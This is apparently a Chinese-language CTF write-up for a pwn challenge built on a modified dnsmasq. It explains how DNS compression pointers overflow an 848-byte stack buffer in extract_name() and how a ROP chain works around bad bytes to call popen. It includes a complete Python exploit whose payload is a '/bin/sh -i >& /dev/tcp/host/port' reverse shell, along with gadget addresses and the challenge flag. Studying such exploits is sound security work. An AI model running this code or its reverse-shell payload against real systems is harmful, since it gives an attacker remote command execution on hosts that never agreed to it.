# Master of DNS

## 题目简述

附件是一个由 dnsmasq 2.86 修改而来的 32 位 DNS 服务，默认通过 UDP 9999 端口接收查询。题目关闭了 TCP 查询路径，并在域名解压函数 `extract_name()` 中加入一个 848 字节栈缓冲区；域名解析完成后，程序直接按解压后的 `namelen` 执行 `memcpy(vul, name, namelen)`，没有检查目标缓冲区大小。

DNS 压缩指针可以让很短的报文反复引用已有标签，产生远长于原始 QNAME 的解压结果。构造超过 848 字节的域名即可覆盖返回地址。二进制是无 PIE 的 i386 ELF，栈段只有读写权限，因此预期解法是在最多约 123 字节的可控溢出尾部布置 ROP，而不是直接执行栈上 shellcode。

这是一道典型 Pwn 题：DNS 只是把攻击数据送入漏洞函数的载体，决定性步骤仍是控制栈、处理坏字符并组织调用链。

## 解题过程

### 1. 用压缩指针放大域名

DNS QNAME 中，普通标签由“1 字节长度 + 标签内容”编码；若长度字节的高两位为 `11`，当前两个字节就是一个 14 位压缩指针，解析器会跳到报文中的对应偏移继续解压。

仓库中的崩溃 PoC 先放置一个长度为 `0x3f` 的标签，再依次加入指向偏移 `0x0e, 0x10, 0x12, ...` 的指针链：

```python
payload = b"\x3f" * 0x40
for index in range(15):
    payload += b"\xc0" + bytes([0x0E + index * 2])
payload += b"\x00"
```

每次跳转都会让解析器再次吸收一段标签内容。原始报文仍然很短，解压后的 `name` 却超过 848 字节，最终在无界 `memcpy` 中覆盖 `vul` 后方的栈数据。正式 EXP 把指针数调整为 13，使解压后的尾部恰好对齐到保存的返回地址。

### 2. 处理域名格式造成的约束

该溢出不是任意长度写。单个 DNS 标签最多 `0x3f` 字节，解压后的文本在标签之间插入字节 `0x2e`，并以 `0x00` 结束；可用于 ROP 的尾部约 123 字节。直接调用 `mprotect` 后搬运 shellcode，或构造较长的 ORW 链，都会受到空间和坏字符限制。

题目特意提供了两组适合短链利用的 gadget：

```text
0x08059d44: pop eax; ret

0x0804b2b1: add eax, 4
0x0804b2b4: pop edx
0x0804b2b5: xor edx, 0xffffffff
0x0804b2bb: mov dword ptr [eax], edx
0x0804b2bd: ret

0x0804a92e: nop
0x0804a92f: ret
```

先令 `eax = bss_addr`，之后每调用一次 `0x0804b2b1`，就把 `eax` 增加 4，并将栈上的值按位取反后写入该地址。命令字符串中的 `0x00` 和 IP 地址中的 `0x2e` 会先被取反编码，因而不会作为坏字符直接出现在域名数据中；gadget 执行时再恢复原值。

两段 ROP 数据之间必然出现一个由域名解压器插入的 `0x2e`。利用代码把其后的三个字节安排为 `a9 04 08`，四字节按小端序组合后正好是 `0x0804a92e`，即无副作用的 `nop; ret`，从而把协议强制插入的点号变成有效返回地址的一部分。

### 3. 写入命令并调用 `popen`

利用链使用的关键地址均可从附件直接核对：

| 用途 | 地址 |
| --- | ---: |
| `popen@plt` | `0x0804ab40` |
| `exit@plt` | `0x0804ad30` |
| `pop eax; ret` | `0x08059d44` |
| 自增、取反并写内存 gadget | `0x0804b2b1` |
| `nop; ret` | `0x0804a92e` |
| `.bss` 写入区 | `0x080a7070` |
| 数据段中的字符串 `"w"` | `0x080a6660` |

把 44 字节以内的反弹 shell 命令补零到 44 字节，拆成 11 个小端 dword，再逐个取反后写入 `.bss + 4`。最后按 i386 cdecl 调用约定布置

```text
popen@plt
exit@plt
bss_addr + 4
w_string_addr
```

也就是在 `popen(command, "w")` 返回后进入 `exit`，避免继续执行损坏的栈。

下面是整理后的完整报文构造代码。回连地址通过参数传入，代码会检查命令长度以及进入 QNAME 的原始字节中是否意外出现 `0x00` 或 `0x2e`：

```python
import argparse
import os
import socket
import struct


POPEN = 0x0804AB40
EXIT = 0x0804AD30
NOP_RET_2E = 0x0804A92E
POP_EAX = 0x08059D44
WRITE_DWORD = 0x0804B2B1
W_STRING = 0x080A6660
BSS = 0x080A7070


def p32(value):
    return struct.pack("<I", value)


def build_qname(callback_host, callback_port):
    command = (
        f"/bin/sh -i >& /dev/tcp/{callback_host}/{callback_port} 0>&1"
    ).encode()
    if len(command) > 44:
        raise ValueError("callback command exceeds the 44-byte write area")
    command = command.ljust(44, b"\x00")
    words = [
        int.from_bytes(command[offset:offset + 4], "little")
        for offset in range(0, 44, 4)
    ]

    qname = b"\x3f" * 0x40
    for index in range(13):
        qname += b"\xc0" + bytes([0x0E + index * 2])

    # 第一个 0x3d 标签：5 字节填充 + 8 字节初始化 + 6 组写入。
    qname += b"\x3d" + b"A" * 5
    qname += p32(POP_EAX) + p32(BSS)
    for value in words[:6]:
        qname += p32(WRITE_DWORD) + p32(value ^ 0xFFFFFFFF)

    # 标签分隔符解压成 0x2e，与后三字节组成 NOP_RET_2E。
    qname += b"\x3f" + p32(NOP_RET_2E)[1:]
    for value in words[6:]:
        qname += p32(WRITE_DWORD) + p32(value ^ 0xFFFFFFFF)
    qname += p32(POPEN) + p32(EXIT) + p32(BSS + 4) + p32(W_STRING)
    qname += b"A" * 4 + b"\x00"

    if b"\x00" in qname[:-1] or b"\x2e" in qname[:-1]:
        raise ValueError("encoded QNAME contains a forbidden byte")
    return qname


def build_query(callback_host, callback_port):
    header = os.urandom(2)
    header += b"\x01\x00"          # 标准查询，启用递归请求。
    header += b"\x00\x01"          # QDCOUNT = 1。
    header += b"\x00\x00" * 3      # ANCOUNT/NSCOUNT/ARCOUNT = 0。
    question = build_qname(callback_host, callback_port)
    question += b"\x00\x01"         # QTYPE = A。
    question += b"\x00\x01"         # QCLASS = IN。
    return header + question


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target-host", required=True)
    parser.add_argument("--target-port", required=True, type=int)
    parser.add_argument("--callback-host", required=True)
    parser.add_argument("--callback-port", required=True, type=int)
    args = parser.parse_args()

    packet = build_query(args.callback_host, args.callback_port)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
        client.sendto(packet, (args.target_host, args.target_port))


if __name__ == "__main__":
    main()
```

先在回连端口监听，再向服务端发送该 UDP 查询。`extract_name()` 返回时跳入 ROP 链，命令被恢复到 `.bss` 并交给 `popen`，取得 shell 后读取 flag。官方题解记录的结果为 `ACTF{d0M@1n_Po1nt3rs_aR3_VuLn3rab1e_1d7a90a63039831c7fcaa53b766d5b2d!!!!!}`。

## 方法总结

本题的漏洞根因是把 DNS 解压后的逻辑长度直接用于固定栈缓冲区复制。压缩指针负责把短报文扩展到溢出长度，真正的利用难点则是 123 字节空间、标签分隔符 `0x2e` 和字符串终止符 `0x00` 共同造成的 ROP 约束。

利用链通过三个针对性设计化解限制：用取反写 gadget 在 `.bss` 恢复含坏字符的命令；让协议插入的 `0x2e` 拼成 `nop; ret` 地址；最后只调用参数很少的 `popen(command, "w")`。分析类似协议解析漏洞时，需要同时区分“报文中的编码长度”“解压后的逻辑长度”和“落入目标缓冲区的可控长度”。
